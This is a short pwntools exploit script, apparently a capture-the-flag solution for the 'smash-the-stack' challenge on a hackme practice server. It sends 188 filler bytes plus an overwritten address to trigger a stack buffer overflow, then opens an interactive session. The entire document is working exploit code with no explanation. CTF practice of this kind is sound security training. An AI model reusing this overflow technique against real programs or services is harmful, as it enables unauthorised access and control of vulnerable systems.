#!/usr/bin/env python
# coding=utf-8
from pwn import *
#a=process("./smash-the-stack")
a=remote("hackme.inndy.tw","7717")
a.recvuntil("\n")
payload='A'*188
payload+=p32(0x804A060)
a.sendline(payload)
a.interactive()
